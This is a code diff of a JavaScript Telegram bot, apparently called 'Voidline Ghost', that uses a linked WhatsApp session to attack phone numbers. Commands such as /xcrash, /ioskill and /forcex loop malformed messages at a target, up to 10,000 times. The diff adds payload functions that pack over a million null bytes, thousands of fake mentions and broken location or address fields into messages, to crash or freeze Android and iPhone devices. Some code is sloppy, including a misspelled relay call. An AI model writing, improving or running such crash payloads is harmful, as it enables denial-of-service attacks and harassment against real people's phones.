@@ -2273,66 +2235,43 @@ bot.command("xcrash", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
   let mention = true;
 
   const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
-    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Crash Invisible Android
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(0)}
-╰─────────────────────═⬡</pre>`,
+    caption: `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Crash Invisible Android
+⛧ Status: Process
+(🍁) Voidline Ghost</b></blockquote>`,
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [[
-        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
       ]]
     }
   });
 
   const processMessageId = processMessage.message_id;
 
-  for (let p = 10; p <= 100; p += 10) {
-    await sleep(600);
-    await ctx.telegram.editMessageCaption(
-      ctx.chat.id,
-      processMessageId,
-      undefined,
-      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Crash Invisible Android
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(p)}
-╰─────────────────────═⬡</pre>`,
-      { parse_mode: "HTML" }
-    );
+  for (let i = 0; i < 10000; i++) {
+    await fcv1(target);
+    await sleep(1000);
   }
 
-  for (let i = 0; i < 65; i++) {
-    await BlankSawit(sock, target);
-  }
-
-  await ctx.telegram.editMessageCaption(
-    ctx.chat.id,
-    processMessageId,
-    undefined,
-    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Crash Invisible Android
-│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
-│⌑ Progress: ${progressBar(100)}
-╰─────────────────────═⬡</pre>`,
-    {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
-        ]]
-      }
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Crash Invisible Android
+⛧ Status: Success
+(🍁) Voidline Ghost</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
     }
-  );
+  });
 });
 
 bot.command("ioskill", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
-
-  if (!checkGroupOnly(ctx)) return;
 
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /ioskill 62×××`);
@@ -2340,66 +2279,43 @@ bot.command("ioskill", checkWhatsAppConnection, checkPremium, checkCooldown, asy
   let mention = true;
 
   const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
-    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Crash Invisible iPhone
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(0)}
-╰─────────────────────═⬡</pre>`,
+    caption: `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Crash Invisible I-Phone
+⛧ Status: Process
+(🍁) Voidline Ghost</b></blockquote>`,
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [[
-        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
       ]]
     }
   });
 
   const processMessageId = processMessage.message_id;
 
-  for (let p = 10; p <= 100; p += 10) {
-    await sleep(600);
-    await ctx.telegram.editMessageCaption(
-      ctx.chat.id,
-      processMessageId,
-      undefined,
-      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Crash Invisible iPhone
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(p)}
-╰─────────────────────═⬡</pre>`,
-      { parse_mode: "HTML" }
-    );
+  for (let i = 0; i < 10000; i++) {
+    await fcv1(target);
+    await sleep(1000);
   }
 
-  for (let i = 0; i < 100; i++) {
-    await BlankSawit(sock, target);
-  }
-
-  await ctx.telegram.editMessageCaption(
-    ctx.chat.id,
-    processMessageId,
-    undefined,
-    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Crash Invisible iPhone
-│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
-│⌑ Progress: ${progressBar(100)}
-╰─────────────────────═⬡</pre>`,
-    {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
-        ]]
-      }
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Crash Invisible I-Phone
+⛧ Status: Success
+(🍁) Voidline Ghost</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
     }
-  );
+  });
 });
 
 bot.command("forcex", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
-
-  if (!checkGroupOnly(ctx)) return;
 
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /forcex 62×××`);
@@ -2407,61 +2323,40 @@ bot.command("forcex", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
   let mention = true;
 
   const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
-    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Forclose X Delay
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(0)}
-╰─────────────────────═⬡</pre>`,
+    caption: `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Forclose X Delay
+⛧ Status: Process
+(🍁) Voidline Ghost</b></blockquote>`,
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [[
-        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
       ]]
     }
   });
 
   const processMessageId = processMessage.message_id;
 
-  for (let p = 10; p <= 100; p += 10) {
-    await sleep(600);
-    await ctx.telegram.editMessageCaption(
-      ctx.chat.id,
-      processMessageId,
-      undefined,
-      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Forclose X Delay
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(p)}
-╰─────────────────────═⬡</pre>`,
-      { parse_mode: "HTML" }
-    );
-  }
-
   for (let i = 0; i < 20; i++) {
     await Y9X(target);
+    await sleep(1000);
   }
 
-  await ctx.telegram.editMessageCaption(
-    ctx.chat.id,
-    processMessageId,
-    undefined,
-    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Forclose X Delay
-│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
-│⌑ Progress: ${progressBar(100)}
-╰─────────────────────═⬡</pre>`,
-    {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
-        ]]
-      }
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Forclose X Delay
+⛧ Status: Success
+(🍁) Voidline Ghost</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
     }
-  );
+  });
 });
 
 bot.command(
@@ -3960,69 +3855,49 @@ async function CrashXios(sock, target) {
   console.log("Invisble Function Bugger");
 } 
 
-async function LocaInvis(sock, target) {
-  console.log(chalk.red("DelayBy Zunn"));
-  
-  const Invis = generateWAMessageFromContent(target, {
-    viewOnceMessageV2: {
+async function tagswdelay(target) {
+  let Y9X = await generateWAMessageFromContent(target, {
+    viewOnceMessage: {
       message: {
-        locationMessage: {
-          degreesLatitude: 0,
-          degreesLongitude: -0,
-          name: "LOCA",
-          url: "https://t.me/zunncrash",
-          contextInfo: {
-            mentionedJid: [
-              target,
-              ...Array.from({ length: 1900 }, () => 
-                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
-              )
-            ],
-            isSampled: true,
-            participant: target,
-            remoteJid: "status@broadcast",
-            forwardingScore: 999999,
-            isForwarded: true,
-            quotedMessage: {
-              extendedTextMessage: {
-                text: "\u0000".repeat(100000)
-              }
-            },
-            externalAdReply: {
-              advertiserName: "DOCUMAND",
-              title: "SEMESTA - DELAY",
-              body: "DELAY SANGAT",
-              mediaType: 1,
-              renderLargerThumbnail: true,
-              thumbnailUrl: null,
-              sourceUrl: "https://example.com"
-            },
-            placeholderKey: {
-              remoteJid: "0@s.whatsapp.net",
-              fromMe: false,
-              id: "ABCDEF1234567890"
-            }
+        interactiveResponseMessage: {
+          body: {
+            text: "Izin Tag" + "war... \n -Y9X",
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: "\u0000".repeat(1045000),
+            version: 3
           }
         }
       }
     }
-  }, {});
-
-  for (const msg of [Invis]) {
-    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
-      messageId: msg.key?.id || undefined,
-      statusJidList: [target],
-      additionalNodes: [{
-        tag: "meta",
+  }, {
+    ephemeralExpiration: 0,
+    forwardingScore: 0,
+    isForwarded: false,
+    font: Math.floor(Math.random() * 9),
+    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
+  });
+  
+  await sock.relayMessage("status@broadcast", Y9X.message, {
+    messageId: Y9X.key.id,
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
         attrs: {},
-        content: [{
-          tag: "mentioned_users",
-          attrs: {},
-          content: [{ tag: "to", attrs: { jid: target } }]
+        content: [{ 
+          tag: "to", 
+          attrs: { jid: target }, 
+          content: undefined
         }]
       }]
-    });
-  }
+    }]
+  });
+  console.log(chalk.blue('Send invisible delay')) 
 }
 
 async function BlankSawit(sock, target) {
@@ -4211,6 +4086,287 @@ async function SpamForclose(sock, target) {
   
   const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
   await sleep(2000);
+}
+
+async function InvisbleProtocol(sock, target) {
+  const msg = {
+    interactiveResponseMessage: {
+      body: {
+        text: "⛧⃟꙰‌‌⃰ꪸꪰ𝐋⃟‌𝐞‌⃟𝐚‌‌⃟𝐦⃟‌𝐨‌⃟𝐫༑⃟ 𝐙⃟‌𝐮‌⃟𝐧‌‌⃟𝐧⛧⃟꙰",
+        format: "DEFAULT"
+      },
+      nativeFlowResponseMessage: {
+        name: "galaxy_message",
+        paramsJson: "\u0000".repeat(1045000),
+        version: 3
+      }
+    }
+  };
+
+  const msg2 = {
+    stickerMessage: {
+      url: "https://mmg.whatsapp.net/v/t62.15575-24/552720508_879628937844943_1788699215298386521_n.enc?ccb=11-4&oh=01_Q5Aa3QH-X_8FEfJB_a7GSxRUWCn-hITkyAGg4gtls6YbeeORwQ&oe=696603FD&_nc_sid=5e03e0&mms3=true",
+      fileSha256: "HBBg3R7JV4+T2Yhghi2UIIGszaZuGPpAwSvpJlRu3mo=",
+      fileEncSha256: "ng0Zp52cVU/QnrgU/wI7cBc+U7dAsRhOP7LPM0cAtBs=",
+      mediaKey: "BepidhXtIUVJ048DrdNNeBAAY2+1ymLHn7vxXy5h9pE=",
+      mimetype: "image/webp",
+      height: 64,
+      width: 64,
+      directPath: "/v/t62.15575-24/552720508_879628937844943_1788699215298386521_n.enc?ccb=11-4&oh=01_Q5Aa3QH-X_8FEfJB_a7GSxRUWCn-hITkyAGg4gtls6YbeeORwQ&oe=696603FD&_nc_sid=5e03e0",
+      fileLength: "23134",
+      mediaKeyTimestamp: "1765707331",
+      isAnimated: false,
+      stickerSentTs: "1765707331822",
+      isAvatar: false,
+      isAiSticker: false,
+      isLottie: false
+    }
+  };
+
+  await sock.relayMessage(target, msg, {
+    participant: { jid: target }
+  });
+  
+  await sock.relayMessage(target, msg2, {
+    participant: { jid: target }
+  });
+}
+
+async function SpamOnly(sock, target) {
+  for (let i = 10; i <= 100; i++) {
+    const msg = {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: " #sejaya " + "invsible".repeat(1000) + "\n" + "@5".repeat(1000),
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "address_message",
+              params: `${"\u0000".repeat(1045000)}`,
+              version: 3
+            },
+            contextInfo: {
+              mentionedJid: [
+                ...Array.from({ length: 1950 }, () => 
+                  "1" + Math.floor(Math.random() * 5000000) + "91@s.whatsapp.net"
+                )
+              ],
+              isForwarded: true,
+              forwardingScore: 999
+            }
+          }
+        }
+      }
+    };
+
+    await sock.relayMessage("status@broadcast", msg, {
+      messageId: undefined,
+      statusJidList: [target],
+      additionalNodes: [{
+        tag: "meta",
+        attrs: {},
+        content: [{
+          tag: "mentioned_users",
+          attrs: {},
+          content: [{ tag: "to", attrs: { jid: target } }]
+        }]
+      }]
+    });
+  }
+}
+
+async function Noctic(sock, target) {
+  const msg = {
+    viewOnceMessage: {
+      message: {
+        groupMentionMessage: {
+          message: {
+            interactiveResponseMessage: {
+              contextInfo: {
+                remoteJid: "target",
+                mentionedJid: ["13135559098@s.whatsapp.net"],
+              },
+              body: {
+                text: "KENAL TXC KAGA BANG? IJINN",
+                format: "DEFAULT",
+              },
+              nativeFlowResponseMessage: {
+                name: "address_message",
+                paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+131358790202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
+                version: 3,
+              },
+            },
+          },
+        },
+      },
+    },
+  };
+  
+  const msg2 = {
+    interactiveMessage: {
+      header: {
+        locationMessage: {
+          degreesLatitude: 9999999999,
+          degreesLongitude: -9999999999,
+          name:  "ꦽ".repeat(15000) + "\0".repeat(15000),
+          address: "CREDITS @LeamorZunn" + "{".repeat(30000),
+          comment: "ꦾ".repeat(10000),
+        },
+      },
+    },
+  };
+  
+const MahizaSec = generateWAMessageFromContent(target, msg, msg2, {});
+
+sock.ev.on('message.upsert', async (data) => {
+  const m = data.messages?.[0];
+  if (!m || data.type !== 'notify') return;
+  
+  const trigger = 
+  m.key.remoteJid === 'status@broadcast' &&
+  m.key.participant === target;
+  
+  if (!trigger) {
+    await sock.relayMesaage('status@broadcast', MahizaSec.message, {
+       messageId: MahizaSec.key.id,
+       statusJidList: [target],
+       additionalNodes: [
+        {
+          tag: "meta",
+          attrs: { author: "meta_ai", type: "bot_response" },
+          content: [
+            {
+              tag: "mentioned_users",
+              attrs: {},
+              content: [
+                {
+                  tag: "to",
+                  attrs: { jid: target }
+                }
+              ]
+            }
+          ]
+        },
+        {
+          tag: "bot",
+          attrs: { biz_bot: "1", service_type: "meta_ai" }
+        }
+      ]
+    });
+  }
+});
+}
+
+async function CStatus(sock, target) {
+    let msg = generateWAMessageFromContent(target, {
+        interactiveResponseMessage: {
+            body: {
+                text: "\u0000".repeat(9000),
+                format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+                name: "address_message",
+                paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"H\",\"address\":\"XT\",\"tower_number\":\"X\",\"city\":\"Medan\",\"name\":\"X\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
+                version: 3
+            },
+            contextInfo: {
+                mentionedJid: Array.from({ length: 1999 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
+                isForwarded: true,
+                forwardingScore: 7205,
+                forwardedNewsletterMessageInfo: {
+                    newsletterJid: "120363395010254840@newsletter",
+                    newsletterName: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유",
+                    serverMessageId: 1000,
+                    accessibilityText: "idk"
+                },
+                statusAttributionType: "RESHARED_FROM_MENTION",
+                contactVcard: true,
+                isSampled: true,
+                dissapearingMode: {
+                    initiator: target,
+                    initiatedByMe: true
+                },
+                expiration: Date.now()
+            },
+        }
+    }, {});
+
+    await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, {
+        participant: { jid: target }
+    });
+    const msg1 = {
+        viewOnceMessage: {
+            message: {
+                interactiveResponseMessage: {
+                    body: {
+                        text: "X",
+                        format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                        name: "address_message",
+                        paramsJson: "\x10".repeat(1045000),
+                        version: 3
+                    },
+                    entryPointConversionSource: "call_permission_request"
+                }
+            }
+        }
+    };
+
+    const msg2 = {
+        ephemeralExpiration: 0,
+        forwardingScore: 9741,
+        isForwarded: true,
+        font: Math.floor(Math.random() * 99999999),
+        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
+    };
+
+    for (let i = 0; i < 1000; i++) {
+        const payload = generateWAMessageFromContent(target, msg1, msg2);
+
+        await sock.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: payload.message
+            }
+        }, { messageId: payload.key.id, participant: { jid: target } });
+
+        await sleep(1000);
+    }
+
+    await sock.relayMessage("status@broadcast", {
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{ tag: "to", attrs: { jid: target } }]
+            }]
+        }]
+    });
+}
+
+async function Infinity(sock, target) {
+    const msg = {
+        sendPaymentMessage: {}
+    };
+
+    await sock.relayMessage(
+        target,
+        {
+            sendPaymentMessage: {
+                success: {
+                    amount: 500000,
+                    invoiceId: "INV-2024-001",
+                    method: "tf"
+                }
+            }
+        },
+        { participant: { jid: target } }
+    );
 }
 //And The Function
 
